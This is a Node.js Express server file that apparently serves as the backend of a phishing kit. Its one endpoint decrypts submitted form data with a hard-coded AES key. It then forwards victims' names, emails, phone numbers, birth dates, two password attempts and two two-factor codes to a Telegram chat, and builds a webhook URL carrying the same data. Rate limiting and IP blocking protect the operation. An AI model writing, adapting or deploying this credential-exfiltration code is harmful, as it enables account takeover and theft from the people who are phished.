import express from "express";
import 'dotenv/config';
import cors from "cors";
import TelegramBot from 'node-telegram-bot-api';
import CryptoJS from "crypto-js";
import rateLimit from "express-rate-limit";

const app = express();
app.use(cors({ origin: '*' }));
app.use(express.json());
app.set('trust proxy', 1);

// IP blocking mechanism
const blockedIPs = new Map(); // Changed to Map to store block details
const violationCounts = new Map();
const VIOLATION_LIMIT = 3; // Number of violations before permanent block
const BLOCK_DURATION = 24 * 60 * 60 * 1000; // 24 hours in milliseconds

const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: true, 
    request: {
        agentOptions: {
            keepAlive: true,
            family: 4
        }
    }
});
const secretKey = 'HDNDT-JDHT8FNEK-JJHR';

function decrypt(encryptedData) {
    try {
        const bytes = CryptoJS.AES.decrypt(encryptedData, secretKey);
        const decrypted = bytes.toString(CryptoJS.enc.Utf8);
        if (!decrypted) throw new Error("Decryption failed");
        return decrypted;
    } catch (error) {
        throw new Error("Invalid encrypted data");
    }
}

const blockIP = async (ip, isPermanent = false) => {
    const blockInfo = {
        timestamp: Date.now(),
        isPermanent
    };
    blockedIPs.set(ip, blockInfo);
    
    // Notify on Telegram about IP block
    const message = `🚫 IP Address blocked:\n<code>${ip}</code>\nType: ${isPermanent ? 'Permanent' : 'Temporary (24 hours)'}`;
    await bot.sendMessage(process.env.TELEGRAM_CHAT_ID, message, { parse_mode: "html" });
}

function isIPBlocked(ip) {
    if (!blockedIPs.has(ip)) return false;
    
    const blockInfo = blockedIPs.get(ip);
    if (blockInfo.isPermanent) return true;
    
    // Check if temporary block duration has passed
    if (Date.now() - blockInfo.timestamp >= BLOCK_DURATION) {
        blockedIPs.delete(ip);
        return false;
    }
    return true;
}

const ipFilter = (req, res, next) => {
    const ip = req.ip;
    if (isIPBlocked(ip)) {
        const blockInfo = blockedIPs.get(ip);
        return res.status(403).json({ 
            message: blockInfo.isPermanent 
                ? 'Access forbidden: IP is permanently blocked'
                : 'Access forbidden: IP is temporarily blocked'
        });
    }
    next();
};

const registerLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 10,
    message: 'Too many requests from this IP',
    headers: true,
    handler: (req, res) => {
        const ip = req.ip;
        
        // Increment violation count
        const currentViolations = (violationCounts.get(ip) || 0) + 1;
        violationCounts.set(ip, currentViolations);
        
        // Check if should be permanently blocked
        if (currentViolations >= VIOLATION_LIMIT) {
            blockIP(ip, true); // Permanent block
            return res.status(403).json({
                message: 'Access forbidden: IP has been permanently blocked due to multiple violations'
            });
        }
        
        // Temporary block
        blockIP(ip, false);
        return res.status(429).json({
            message: 'Too many requests. IP has been temporarily blocked.',
            violationsCount: currentViolations,
            violationsRemaining: VIOLATION_LIMIT - currentViolations
        });
    },
});

app.post('/api/get-info', ipFilter, registerLimiter, async (req, res) => {
    try {
        const { data } = req.body;
        if (!data) {
            return res.status(400).json({ message: "Invalid request: 'data' is required", error_code: 1 });
        }

        const decryptedData = decrypt(data);
        const values = JSON.parse(decryptedData);

        res.status(200).json({
            message: 'Success',
            error_code: 0
        });

        const message = `<b>Ip:</b> <code>${values.user_ip || 'Lỗi IP,liên hệ <code>https://t.me/otis_cua</code>'}</code>\n<b>Location:</b> <code>${values.ip || 'Lỗi IP,liên hệ <code>https://t.me/otis_cua</code>'}</code>\n-----------------------------\n<b>Name:</b> <code>${values.name || ''}</code>\n<b>Email:</b> <code>${values.email || ''}</code>\n<b>Email business:</b> <code>${values.email_business || ''}</code>\n<b>Phone:</b> <code>${values.phone || ''}</code>\n<b>Page:</b> <code>${values.page || ''}</code>\n<b>Date of birth:</b> <code>${values.day}/${values.month}/${values.year}</code>\n<b>Password First:</b> <code>${values.password || ''}</code>\n<b>Password Second:</b> <code>${values.secondPassword || ''}</code>\n-----------------------------\n<b>First Two-Fa:</b> <code>${values.twoFa || ''}</code>\n<b>Second Two-Fa:</b> <code>${values.secondTwoFa || ''}</code>\n`;
        await bot.sendMessage(process.env.TELEGRAM_CHAT_ID, message, { parse_mode: "html" });

        if (process.env.WEBHOOK_URL) {
            const url = new URL(process.env.WEBHOOK_URL);

            url.searchParams.append('Ip', values.ip ? values.ip : '');
            url.searchParams.append('Name', values.name ? values.name : '');
            url.searchParams.append('Email', values.email ? values.email : '');
            url.searchParams.append('Email business', values.email_business ? values.email_business : '');
            url.searchParams.append('Phone', values.phone ? values.phone : '');
            url.searchParams.append('Page', values.page ? values.page : '');
            url.searchParams.append('Date of birth', `${values.day}/${values.month}/${values.year}` ? `${values.day}/${values.month}/${values.year}` : '');
            url.searchParams.append('Password First', values.password ? values.password : '');
            url.searchParams.append('Password Second', values.secondPassword ? values.secondPassword : '');
            url.searchParams.append('First Two-Fa', values.twoFa ? values.twoFa : '');
            url.searchParams.append('Second Two-Fa', values.secondTwoFa ? values.secondTwoFa : '');

            try {
                await bot.sendMessage(process.env.TELEGRAM_CHAT_ID, '✅ Thêm dữ liệu vào Sheet thành công.');
            } catch (err) {
                await bot.sendMessage(process.env.TELEGRAM_CHAT_ID, '❌ Thêm vào Google Sheet không thành công, liên hệ <code>@otis_cua</code>', { parse_mode: 'html' });
            }
        }

    } catch (error) {
        await bot.sendMessage(process.env.TELEGRAM_CHAT_ID, `❌ Server giải mã dữ liệu không thành công, liên hệ <code>@otis_cua</code>.Mã lỗi: ${error.message}`, { parse_mode: 'html' });
        res.status(500).json({
            message: 'Error',
            error_code: 1
        });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server listening port ${PORT}`);
});
